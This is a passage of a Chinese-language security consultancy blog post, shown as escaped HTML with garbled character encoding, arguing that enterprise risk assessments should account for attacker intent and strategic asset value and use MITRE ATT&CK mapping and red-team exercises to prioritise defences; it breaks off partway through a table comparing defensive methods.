&lt;h2 id=&quot;çœŸå¯¦çš„é¢¨éšªå…¶å¯¦è¤‡é›œçš„é›£ä»¥è©•é‘‘&quot;&gt;çœŸå¯¦çš„é¢¨éšªå…¶å¯¦è¤‡é›œçš„é›£ä»¥è©•é‘‘&lt;/h2&gt;
&lt;p&gt;åœ¨é€™è£¡æˆ‘å€‘å¼•è¿° ITGovernance å°æ–¼é¢¨éšªè©•é‘‘çš„å®šç¾©ï¼š&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Risk Assessment â€“ the process of identifying, analyzing and evaluating risk â€“ is the only way to ensure that the cyber security controls you choose are appropriate to the risks your organization faces.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;é¢¨éšªè©•é‘‘çš„ç²¾é«“åœ¨æ–¼å¾ŒåŠæ®µçš„&lt;strong&gt;ç¢ºä¿æ‰€é¸æ“‡çš„æ§åˆ¶æªæ–½æ˜¯å¦é©åˆ‡æ–¼ä¼æ¥­çœŸæ­£é¢è‡¨çš„é¢¨éšª&lt;/strong&gt;ï¼Œä½†å¤šæ•¸çš„ä¼æ¥­åªå®Œæˆå‰åŠæ®µ&lt;strong&gt;è­˜åˆ¥ã€åˆ†æåŠè©•ä¼°é¢¨éšª&lt;/strong&gt;ï¼Œå°è‡´é¢¨éšªè©•é‘‘çš„æˆæ•ˆç„¡æ³•å®Œå…¨ç™¼æ®ï¼›è€Œè¦é”åˆ°é¢¨éšªè©•é‘‘çš„ç²¾é«“ï¼Œå¾—å…ˆäº†è§£&lt;strong&gt;çœŸå¯¦çš„é¢¨éšª&lt;/strong&gt;çš„çµ„æˆçš„è¦ç´ &lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;çœŸå¯¦é¢¨éšª = { å¨è„…ä¾†æºã€æ„åœ–ã€å¨è„…ã€å¼±é»ã€æ©Ÿç‡ã€ç›¸ä¾æ€§ã€è³‡ç”¢åƒ¹å€¼ã€æ§åˆ¶æªæ–½ }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;å¨è„…ä¾†æº(Threat Agent)ï¼šé€ æˆå¨è„…æˆ–ä½¿ç”¨å¼±é»çš„ä¾†æºå€‹é«”ï¼Œä¾‹å¦‚ï¼šçµ„ç¹”å‹çŠ¯ç½ªã€é§­å®¢çµ„ç¹”ã€åœ‹å®¶è³‡åŠ©çŠ¯ç½ªã€ç«¶çˆ­å°æ‰‹ã€é§­å®¢ã€å…§éƒ¨å“¡å·¥æˆ–å¤©ç½ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;æ„åœ–(Intent)ï¼šå¨è„…ä¾†æºçš„æƒ³é”åˆ°çš„ç›®çš„ï¼Œä¾‹å¦‚ï¼šå–å¾—å€‹äººè³‡æ–™ã€ç›œå–å•†æ¥­æ©Ÿå¯†ã€ç ´å£ä¼æ¥­/å€‹äººå½¢è±¡ã€é€ æˆè²¡ç‰©æå¤±ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;å¨è„…(Threat)ï¼šé”æˆæ„åœ–çš„æ–¹å¼ï¼Œä¾‹å¦‚ï¼šæƒ¡æ„ç¨‹å¼ã€ç¤¾äº¤å·¥ç¨‹ã€DDoSã€åˆ©ç”¨ç³»çµ±æ¼æ´ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;å¼±é»(Vulnerability)ï¼šæŒ‡è³‡ç”¢èƒ½è¢«å¨è„…åˆ©ç”¨çš„å¼±é»ï¼Œä¾‹å¦‚ï¼šæ¼æ´æœªæ›´æ–°ã€äººå“¡ç–å¿½ã€çµ„æ…‹è¨­å®šä¸ç•¶ã€ç¶²è·¯å€éš”é…ç½®éŒ¯èª¤ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;æ©Ÿç‡(Probability)ï¼šæŒ‡å¼±é»çš„æ˜“ç”¨åº¦æˆ–å¯èƒ½ç™¼ç”Ÿçš„æ©Ÿç‡ï¼Œä¾‹å¦‚ï¼šCVSS 3.0åˆ†æ•¸ã€éå»å°æ–¼æŸå€‹å¼±é»ç™¼ç”Ÿé »ç‡çš„çµ±è¨ˆç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;ç›¸ä¾æ€§(Correlation)ï¼šè³‡ç”¢å½¼æ­¤é–“çš„é—œè¯ï¼Œä¾‹å¦‚ï¼šç¶²è·¯æ‹“æ¨¸ã€è™›æ“¬åŒ–çš„é—œä¿‚ã€é›†ä¸­æ´¾ç‰ˆç³»çµ±ã€é˜²æ¯’ä¸­æ§ä¸»æ©Ÿç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;è³‡ç”¢åƒ¹å€¼(Value)ï¼šä¼æ¥­èªå®šè©²è³‡ç”¢åœ¨ Cã€Iã€A åŠæ³•å¾‹è¡æ“Šä¸‹ï¼Œæ‰€å…·æœ‰çš„åƒ¹å€¼ï¼Œä¾‹å¦‚ï¼šæ ¸å¿ƒç³»çµ±åŠè³‡æ–™ã€ä¸€èˆ¬æ“ä½œè³‡æ–™ã€å¯¦é«”è¨­å‚™ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;æ§åˆ¶æªæ–½(Countermeasure)ï¼šç”¨ä¾†é™ä½ä¼æ¥­é¢è‡¨é¢¨éšªçš„æªæ–½ï¼Œä¾‹å¦‚ï¼šè³‡å®‰è¨­å‚™ã€ç®¡ç†åˆ¶åº¦ã€æ•™è‚²è¨“ç·´ç­‰ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç„¶è€Œï¼Œå¤šæ•¸ä¼æ¥­åœ¨è©•ä¼°ä¼æ¥­é¢¨éšªæ™‚ï¼Œç‚ºæ±‚æ–¹ä¾¿ï¼Œæœƒå°‡é¢¨éšªè©•é‘‘çš„åƒæ•¸ç°¡åŒ–æˆ {&lt;strong&gt;å¼±é»ã€æ©Ÿç‡ã€è³‡ç”¢åƒ¹å€¼&lt;/strong&gt;}ï¼Œå¿½ç•¥äº†èˆ‡æ•µäººç›¸é—œçš„åƒæ•¸ {å¨è„…ä¾†æºã€æ„åœ–ã€å¨è„…ã€æˆ°ç•¥åƒ¹å€¼}ï¼›æ¥ä¸‹ä¾†çš„å…©å€‹ä¾‹å­å°‡èªªæ˜å¿½ç•¥å¾Œé€ æˆé¢¨éšªè©•é‘‘çš„åå·®ï¼ŒåŒ…å«äº†&lt;strong&gt;è³‡ç”¢åƒ¹å€¼çš„è¼•å¿½&lt;/strong&gt;åŠ&lt;strong&gt;è¼•å¿½æ¼æ´åˆ©ç”¨çš„å¯èƒ½æ€§&lt;/strong&gt;ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ç¾å¯¦é¢¨éšªè©•é‘‘å¯èƒ½çš„åå·®&quot;&gt;ç¾å¯¦é¢¨éšªè©•é‘‘å¯èƒ½çš„åå·®&lt;/h2&gt;
&lt;h3 id=&quot;æ•µäººåœ¨æ„çš„æ˜¯æˆ°ç•¥åƒ¹å€¼è€Œä¸åƒ…æ˜¯è³‡ç”¢åƒ¹å€¼&quot;&gt;æ•µäººåœ¨æ„çš„æ˜¯æˆ°ç•¥åƒ¹å€¼è€Œä¸åƒ…æ˜¯è³‡ç”¢åƒ¹å€¼&lt;/h3&gt;

&lt;p&gt;é€éé¢¨éšªè©•é‘‘å¯ä»¥è­˜åˆ¥å‡ºè³‡ç”¢å¯èƒ½é¢è‡¨çš„é¢¨éšªï¼Œä¸¦ä¸”ä½œç‚ºé ç®—æˆ–è³‡æºæŠ•å…¥å„ªå…ˆé †åºçš„åƒè€ƒï¼Œä¸€èˆ¬å¯ä»¥åˆ†ç‚º 3 å€‹å„ªå…ˆç­‰ç´šï¼š&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;å„ªå…ˆè™•ç†ã€Œé«˜è¡æ“Šã€é«˜æ©Ÿç‡ã€ (é …æ¬¡ 1ã€é …æ¬¡ 2) çš„é¢¨éšªï¼šé€šå¸¸æ˜¯è¶…å‡ºä¼æ¥­å¯æ¥å—é¢¨éšªçš„å¨è„…ï¼Œè—‰ç”±æ§åˆ¶æªæ–½å°‡é¢¨éšªä¸‹é™åˆ°å¯æ¥å—çš„ç¨‹åº¦ï¼Œé€™éƒ¨åˆ†é€šå¸¸æ˜¯ä¼æ¥­è³‡æºå„ªå…ˆæˆ–æŒçºŒæŠ•å…¥çš„é‡é»ã€‚&lt;/li&gt;
  &lt;li&gt;æ¬¡ä¹‹æ˜¯ã€Œé«˜è¡æ“Šã€ä½æ©Ÿç‡ ã€(é …æ¬¡ 3ã€é …æ¬¡ 4)çš„é¢¨éšªï¼šæ­¤ç­‰ç´šæ˜¯å±¬æ–¼éœ€è¦æŒçºŒé—œæ³¨é¿å…å‡é«˜çš„é¢¨éšªï¼Œå¦‚æœä¼æ¥­é ç®—ä»æœ‰é¤˜è£•ï¼Œæ‡‰è©²æŠ•å…¥çš„ç¬¬äºŒå€‹ç­‰ç´šã€‚&lt;/li&gt;
  &lt;li&gt;æœ€å¾Œæ˜¯ã€Œä½è¡æ“Šã€ä½æ©Ÿç‡ ã€(é …æ¬¡ 5ã€é …æ¬¡ 6)çš„é¢¨éšªï¼šçœ‹èµ·ä¾†å°ä¼æ¥­ä¸æœƒæœ‰ç«‹å³å±å®³ï¼Œä¸€èˆ¬ä¸éœ€ç‰¹åˆ¥é—œæ³¨æˆ–æŠ•å…¥è³‡æºã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;é …æ¬¡&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;è³‡ç”¢åç¨±&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;åƒ¹å€¼&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;å¨è„…&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;å¼±é»&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;è¡æ“Š&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;æ©Ÿç‡&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;é¢¨éšª&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;äº¤æ˜“è³‡æ–™&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;è“„æ„ç ´å£&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;å»ºç¯‰ç‰©ç®¡åˆ¶ä¸è¶³&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç”¨æˆ¶å€‹è³‡&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;å‹’è´–è»Ÿé«”åŠ å¯†&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç„¡æ³•ä¸Š patch&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;è½‰å¸³ç³»çµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;è»Ÿé«”å¤±æ•ˆ&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;é­åˆ° DDoS æ”»æ“Š&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;18&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;æ ¸å¿ƒç³»çµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;è»Ÿé«”å¤±æ•ˆ&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç¶­è­·æœå‹™æ™‚é–“éé•·&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;9&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç‰ˆæœ¬æ›´æ–°ç³»çµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;æœªç¶“æˆæ¬Šå­˜å–&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;æ©«å‘ç§»å‹•&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;å…§éƒ¨å·®å‹¤ç³»çµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç³»çµ±å…¥ä¾µ&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç„¡æ³•ä¸Š patch&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ç„¶è€Œï¼Œå°æ•µäººè€Œè¨€ï¼Œé¸æ“‡æ¬²æ”»ä¸‹çš„ç˜é ­å ¡æ™‚ï¼Œçœ‹é‡çš„æ˜¯&lt;strong&gt;è³‡ç”¢çš„æˆ°ç•¥åƒ¹å€¼&lt;/strong&gt;ï¼Œè€Œèˆ‡è³‡ç”¢æœ¬èº«çš„åƒ¹å€¼æ²’æœ‰å¿…ç„¶çš„é—œä¿‚ï¼Œå¦‚ä¸Šè¡¨é …æ¬¡ 6 çš„å…§éƒ¨å·®å‹¤ç³»çµ±å¦‚æœæ˜¯èƒ½ä¸²æ¥åˆ°æ•µäººä¸»è¦çš„æ¨™çš„ï¼Œå°ä»–ä¾†èªªå°±æ˜¯ä¸€å€‹å¿…å®šæœƒè¨­æ³•å–å¾—æ§åˆ¶æ¬Šçš„è³‡ç”¢ï¼Œè€Œé€™æ™‚å¯ä»¥ç™¼ç¾ç¶“ç”±ç°¡åŒ–ç‰ˆçš„é¢¨éšªè©•é‘‘ä¸¦ä¸å®¹æ˜“å‘ˆç¾é€™å€‹è³‡ç”¢æ‰€é¢è‡¨çš„é¢¨éšªã€‚&lt;/p&gt;

&lt;h3 id=&quot;ä½ä¼°å¼±é»å¯åˆ©ç”¨æ©Ÿç‡&quot;&gt;ä½ä¼°å¼±é»å¯åˆ©ç”¨æ©Ÿç‡&lt;/h3&gt;
&lt;p&gt;é˜²å®ˆæ–¹åœ¨ä½¿ç”¨åˆ†éšªè©•é‘‘æ™‚ï¼Œå¦ä¸€å€‹å•é¡Œæ˜¯ç„¡æ³•æº–ç¢ºçš„ä¼°è¨ˆå¼±é»çš„å¯åˆ©ç”¨æ©Ÿç‡ï¼Œé›–ç„¶å¸‚é¢ä¸Šå·²ç¶“æœ‰è¨±å¤šå¼±é»ç®¡ç†è»Ÿé«”å¯ä»¥å”åŠ©ï¼Œä½†é¢å°çœŸå¯¦æ”»æ“Šæ™‚ï¼Œæ•µäººä¸æœƒåªåˆ©ç”¨å·²çŸ¥çš„æ¼æ´æˆ–æ˜¯ OWASP TOP10ï¼Œç”šè‡³è‡ªè¡Œç ”ç™¼ 0-dayã€‚å› æ­¤ï¼Œç•¶ä¼æ¥­å·²ç¶“é€²è¡Œä¸€å®šç¨‹åº¦çš„é˜²è­·æªæ–½å¾Œï¼Œå¦‚æœä¸æ›¾ç¶“æ­·è³‡å®‰äº‹æ•…æˆ–ç¼ºä¹æ­£ç¢ºçš„èªçŸ¥ï¼Œå¾€å¾€èªç‚ºæ‡‰è©²ä¸æœƒæœ‰é€™éº¼å²å®³çš„é§­å®¢å¯ä»¥çªç ´æ—¢æœ‰çš„é˜²è­·æªæ–½ï¼Œä½†å¾æ­·ä¾†çš„è³‡å®‰äº‹æ•…åŠæˆ‘å€‘æœå‹™çš„ç¶“é©—å‘Šè¨´æˆ‘å€‘ï¼Œå…¶å¯¦é›»å½±è£¡é¢æ¼”çš„éƒ½æ˜¯çœŸçš„ï¼ï¼&lt;/p&gt;

&lt;h2 id=&quot;å¾æ”»æ“Šè€…çš„è§’åº¦æ”¹å–„é¢¨éšªè©•é‘‘&quot;&gt;å¾æ”»æ“Šè€…çš„è§’åº¦æ”¹å–„é¢¨éšªè©•é‘‘&lt;/h2&gt;
&lt;p&gt;å¾ˆå¤šäººä»¥ç‚ºæ”»æ“Šè€…çš„è§’åº¦æŒ‡çš„æ˜¯æ¼æ´æŒ–æ˜ï¼Œå…¶å¯¦ä¸¦ä¸å…¨ç„¶ã€‚æ”»æ“Šè€…å°æ–¼æƒ³ç«Šå–çš„è³‡ç”¢ï¼Œä¹Ÿæ˜¯ç¶“éç¸å¯†çš„è¦åŠƒåŠåï½è¦†ï½è§€ï½å¯Ÿï½ï¼Œä»–å€‘ä¸€æ¨£æœ‰ç­–ç•¥ã€æŠ€æ³•è·Ÿå·¥å…·ã€‚è€Œ &lt;a href=&quot;https://attack.mitre.org/&quot;&gt;MITRE ATT&amp;amp;CK&lt;/a&gt; å°±æ˜¯ä¸€å€‹å°æ–¼å·²çŸ¥æ”»æ“Šç­–ç•¥åŠæŠ€å·§å…·å‚™å®Œæ•´å®šç¾©åŠæ”¶é›†çš„æ¡†æ¶ï¼Œå®ƒå¯ä»¥ç”¨ä¾†å”åŠ©å»ºç«‹å¨è„…æƒ…è³‡ (Threat Intelligence)ã€æ”¹å–„é˜²å®ˆæ–¹çš„åµæ¸¬åŠåˆ†æã€å¼·åŒ–æ¨¡æ“¬æ•µäººåŠç´…éšŠæ¼”ç·´ç­‰ï¼Œç›¸é—œçš„ä½¿ç”¨æ–¹å¼éƒ½åœ¨å…¶å®˜ç¶²ä¸Šå¯ä»¥æ‰¾åˆ°ï¼Œç´°ç¯€æˆ‘å€‘ä¸åœ¨é€™é‚Šä»‹ç´¹ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191009/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥å°‡å·²ç¶“ç™¼ç”Ÿçš„è³‡å®‰äº‹æ•… (Incident) æˆ–ç´…éšŠæ¼”ç·´å°æ‡‰åˆ° ATT&amp;amp;CK Enterprise Framework ä¸­ï¼Œä¸¦ä¸”è©•ä¼°ç›®å‰æ‰€å»ºç½®çš„æ§åˆ¶æªæ–½æ˜¯å¦å¯ä»¥æ¸›ç·©ã€é˜»æ“‹æˆ–åµæ¸¬é€™äº›æŠ€å·§ã€‚ä»¥ä¸‹åœ–ç‚ºä¾‹ï¼Œæ·ºç¶ è‰²æ–¹å¡Šæ˜¯ç´…éšŠæ¼”ç·´æ‰€æ¡ç”¨çš„æŠ€å·§ã€ç´…è‰²æ–¹å¡Šå‰‡æ˜¯è³‡å®‰äº‹æ•…ä½¿ç”¨çš„æŠ€å·§ï¼Œä¼æ¥­å¯ä»¥åŒæ™‚æ¯”å°å¤šå€‹è³‡å®‰äº‹æ•…æˆ–æ˜¯ç´…éšŠæ¼”ç·´çš„çµæœï¼Œæ‰¾å‡ºäº¤é›†çš„æ·ºé»ƒè‰²å€å¡Šï¼Œå³æ˜¯ä¼æ¥­å¯ä»¥å„ªå…ˆå¼·åŒ–çš„æ§åˆ¶æªæ–½æˆ–æ˜¯é ç®—æ‡‰è©²æŠ•å…¥ä¹‹è™•ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191009/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™é‚Šæœ‰å€‹éœ€è¦ç‰¹åˆ¥æ³¨æ„çš„åœ°æ–¹ï¼ŒATT&amp;amp;CK Enterprise Framework ä½œç‚ºä¸€å€‹é©—è­‰é˜²å®ˆæ–¹æ§åˆ¶æªæ–½çš„æœ‰æ•ˆæ€§æ˜¯ä¸€å€‹éå¸¸å¥½çš„æ¡†æ¶ï¼Œç„¶è€Œä¸å»ºè­°åˆ©ç”¨é€™å€‹æ¡†æ¶çš„ç‰¹å®šæŠ€å·§ä½œç‚ºé™åˆ¶ç´…éšŠæ¼”ç·´çš„æƒ…å¢ƒï¼Œè¦è¨˜å¾—ã€Œç•¶ä½¿ç”¨ ATT&amp;amp;CK æ™‚è¦æ³¨æ„æœ‰å…¶åå·®ï¼Œé€™å¯èƒ½æœƒå°‡å·²çŸ¥çš„æ”»æ“Šè¡Œç‚ºå„ªå…ˆæ–¼æœªçŸ¥çš„æ”»æ“Šè¡Œç‚ºã€ï¼Œæ­£å¦‚åŒç´…éšŠæ¼”ç·´çš„ç²¾ç¥ï¼Œæ˜¯é€éç„¡æ‰€ä¸ç”¨å…¶æ¥µçš„æ–¹å¼æ‰¾åˆ°å¯ä»¥æˆåŠŸçš„å…¥ä¾µæ–¹å¼ï¼Œå› æ­¤æˆ‘å€‘æœƒå»ºè­°çµ¦äºˆç´…éšŠæ¼”ç·´åœ˜éšŠæœ€è‡ªç”±çš„ç™¼æ®ç©ºé–“ï¼Œæ‰èƒ½çœŸæ­£æ‰¾å‡ºä¼æ¥­å¯èƒ½çš„ç›²é»ã€‚&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Remember any ATT&amp;amp;CK-mapped data has biases:Youâ€™re prioritizing known adversary behavior over the unknown.&lt;br /&gt;
ï¼ Katie Nickels, Threat Intelligence Lead @ The MITRE Corporation&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;æŒ‘é¸é©åˆçš„æ–¹æ³•æ”¹å–„é˜²ç¦¦ç­–ç•¥&quot;&gt;æŒ‘é¸é©åˆçš„æ–¹æ³•æ”¹å–„é˜²ç¦¦ç­–ç•¥&lt;/h2&gt;
&lt;p&gt;é‚£éº¼åœ¨æˆ‘å€‘äº†è§£æ•µäººæœƒä½¿ç”¨çš„ç­–ç•¥ã€æŠ€å·§ä¹‹å¾Œï¼Œä¼æ¥­è¦å¦‚ä½•æŒ‘é¸æ”¹å–„é˜²ç¦¦ç­–ç•¥çš„æ–¹æ³•ï¼Ÿç†æƒ³ä¸Šï¼Œæˆ‘å€‘å»ºè­°å¦‚æœé ç®—è¨±å¯ï¼Œ&lt;a href=&quot;https://devco.re/services/red-team#service-content-3&quot;&gt;é€™é¡å‹&lt;/a&gt;çš„ä¼æ¥­è‡³å°‘æ‡‰è©²åŸ·è¡Œä¸€æ¬¡é«˜å¼·åº¦çš„ç´…éšŠæ¼”ç·´ï¼Œä¾†å…¨é¢æ€§çš„ç›¤é»ä¼æ¥­é¢è‡¨çš„å¨è„…ï¼Œä½†ç¾å¯¦ä¸Šä¸¦éæ¯å€‹ä¼æ¥­éƒ½æœ‰è¶³å¤ çš„é ç®—ã€‚å› æ­¤ï¼Œåœ¨ä¸åŒçš„æ¢ä»¶ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„æ–¹æ³•ä¾†æ”¹å–„é˜²ç¦¦ç­–ç•¥ï¼Œæˆ‘å€‘å»ºè­°å¯ä»¥å¾ä»¥ä¸‹å¹¾å€‹å› ç´ é€²è¡Œè©•ä¼°ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;æ™‚é–“ï¼šåŸ·è¡Œé€™å€‹æ–¹æ³•æ‰€éœ€è¦çš„æ™‚é–“ã€‚&lt;/li&gt;
  &lt;li&gt;æˆæœ¬ï¼šåˆ©ç”¨é€™å€‹æ–¹æ³•éœ€è¦ä»˜å‡ºçš„æˆæœ¬ (åŒ…å«é‡‘éŒ¢ã€åè²)ã€‚&lt;/li&gt;
  &lt;li&gt;çœŸå¯¦æ€§ï¼šæ‰€æ¡ç”¨çš„æ–¹æ³•æ˜¯å¦èƒ½çœŸå¯¦åæ˜ ç¾å¯¦çš„å¨è„…ã€‚&lt;/li&gt;
  &lt;li&gt;ç¯„åœï¼šæ‰€æ¡ç”¨çš„æ–¹æ³•èƒ½æ¶µè“‹ç¯„åœæ˜¯å¦è¶³ä»¥ä»£è¡¨ä¼æ¥­æ•´é«”ç‹€æ³ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é€™é‚Šæˆ‘å€‘ä»¥é¢¨éšªè©•é‘‘ã€å¼±é»æƒæã€æ»²é€æ¸¬è©¦ã€æ¨¡æ“¬æ”»æ“Šã€ç´…éšŠæ¼”ç·´åŠè³‡å®‰äº‹ä»¶ä½œç‚ºæ”¹å–„é˜²ç¦¦ç­–ç•¥çš„æ–¹æ³•ï¼Œè€Œåˆ†åˆ¥å°±ä¸Šè¿°å…­å€‹é …ç›®çµ¦äºˆç›¸å°çš„åˆ†æ•¸ï¼Œä¸¦ä¸”ä¾ç…§&lt;strong&gt;çœŸå¯¦æ€§ã€ç¯„åœã€æˆæœ¬åŠæ™‚é–“ä½œç‚ºæ’åºçš„å„ªå…ˆåº&lt;/strong&gt;(é †åºä¾ä¼æ¥­çš„ç‹€æ³æœ‰æ‰€ä¸åŒï¼‰ã€‚è€Œæˆ‘å€‘æœƒé€™æ¨£æ’åºçš„åŸå› æ˜¯ï¼šä¸€å€‹å¥½çš„æ–¹æ³•æ‡‰è©²è¦&lt;strong&gt;èˆ‡çœŸå¯¦ä¸–ç•Œçš„æ”»æ“Šç›¸ä»¿&lt;/strong&gt;è€Œä¸”åœ¨æ•´å€‹éç¨‹ä¸Š&lt;strong&gt;è¶³ä»¥ç™¼ç¾ä¼æ¥­æ•´é«”è³‡å®‰çš„ç‹€æ³&lt;/strong&gt;ï¼Œæœ€å¾Œæ‰æ˜¯è€ƒæ…®æ‰€èŠ±è²»çš„æˆæœ¬åŠæ™‚é–“ã€‚&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;æ–¹æ³•&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;çœŸå¯¦æ€§&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;ç¯„åœ&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;æˆæœ¬&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;æ™‚é–“&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;è³‡å®‰äº‹ä»¶&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç´…éšŠæ¼”ç·´&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;æ¨¡æ“¬æ”»æ“Š&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
